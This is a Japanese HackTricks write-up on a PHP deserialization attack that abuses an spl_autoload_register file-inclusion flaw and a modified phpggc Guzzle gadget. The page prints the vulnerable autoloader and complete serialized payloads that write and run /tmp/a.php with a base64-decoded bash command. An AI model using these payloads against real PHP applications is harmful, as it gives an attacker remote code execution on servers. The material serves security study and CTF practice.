# PHP - シリアライゼーション + オートロードクラス

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

まず、[**オートロードクラス**](https://www.php.net/manual/en/language.oop5.autoload.php)について確認してください。

## PHPシリアライゼーション + spl\_autoload\_register + LFI/ガジェット

**`phpggc`**内にガジェットに対して脆弱なライブラリが**ない**状態で、**PHPシリアライゼーションがあるwebapp**を見つけました。しかし、同じコンテナ内には、脆弱なライブラリを持つ**異なるcomposer webapp**がありました。したがって、目標は**他のwebappのcomposerローダーをロードし**、それを悪用して**ガジェットをロードし、そのライブラリをガジェットで悪用する**ことでした。

手順:

* **シリアライゼーション**を見つけましたが、現在のアプリコードには**ガジェットがありません**
* 次のような**`spl_autoload_register`** 関数を悪用して、`.php` 拡張子を持つ**任意のローカルファイルをロードする**ことができます
* そのために、クラス名が**`$name`**内にあるシリアライゼーションを使用します。シリアライズされたオブジェクトのクラス名には**"/" や "." を使用できません**が、**コード**は**アンダースコア** ("_") を**スラッシュ** ("/") に**置き換えています**。したがって、`tmp_passwd`のようなクラス名は`/tmp/passwd.php`に変換され、コードはそれをロードしようとします。\
**ガジェットの例**は次のようになります: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
**ファイルアップロード**があり、**`.php` 拡張子**のファイルをアップロードできる場合、この機能を**直接悪用**して、すでにRCEを得ることができます。
{% endhint %}

私の場合、そのようなものはありませんでしたが、**同じコンテナ**内に**`phpggc` ガジェットに脆弱なライブラリ**を持つ別のcomposerウェブページがありました。

* この他のライブラリをロードするには、まずその他のウェブアプリの**composerローダーをロード**する必要があります（現在のアプリケーションのものでは、他のライブラリにアクセスできません）。**アプリケーションのパスを知っていれば**、次のように非常に簡単にこれを実現できます：**`O:28:"www_frontend_vendor_autoload":0:{}`**（私の場合、composerローダーは`/www/frontend/vendor/autoload.php`にありました）
* これで、他の**アプリのcomposerローダー**を**ロード**できるようになったので、**`phpggc` ペイロード**を生成する時が来ました。私の場合は、**`Guzzle/FW1`**を使用し、ファイルシステム内の任意のファイルを**書き込むことができました**。
* 注意：**生成されたガジェットは動作していませんでした**。動作させるためには、phpggcの**`chain.php`** ペイロードを**変更**し、クラスの**すべての属性**を**privateからpublicに変更**しました。そうしないと、文字列の逆シリアライズ後、作成されたオブジェクトの属性に値が設定されていませんでした。
* これで、他のアプリのcomposerローダーを**ロード**する方法と、動作する**phpggcペイロード**ができましたが、ガジェットを使用するときにローダーがロードされるように、**同じリクエストでこれを行う必要があります**。そのため、両方のオブジェクトを含むシリアライズされた配列を送信しました：
* **ローダーがロードされた後にペイロードが続く**のがわかります

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* これで、**ファイルを作成し書き込む**ことができますが、ユーザーは**ウェブサーバー内の任意のフォルダーに書き込むことはできません**。したがって、ペイロードにあるように、PHPが**`system`** を呼び出している部分で、**base64** を使ったコマンドが **`/tmp/a.php`** に作成されます。その後、最初に使用したLFIを利用してコンポーザーローダーを読み込んだタイプのペイロードを**再利用して、生成された `/tmp/a.php`** ファイルを読み込むことができます。それをデシリアライゼーションガジェットに追加するだけです：

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**ペイロードの要約**

* 同じコンテナ内の別のウェブアプリの **composerのautoloadを読み込む**
* 別のウェブアプリのライブラリを悪用するために **phpggcガジェットを読み込む**（最初のウェブアプリはライブラリにガジェットがなかった）
* ガジェットは、悪意のあるコマンドを含むPHPペイロードを/tmp/a.phpに **ファイルを作成する**（ウェブアプリのユーザーはどのウェブアプリのフォルダにも書き込むことができない）
* ペイロードの最終部分では、生成されたphpファイルを **読み込んでコマンドを実行する**

このデシリアライゼーションを**2回呼び出す必要があった**。テスト中、最初の呼び出しでは`/tmp/a.php`ファイルが作成されたが読み込まれず、2回目に正しく読み込まれた。

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
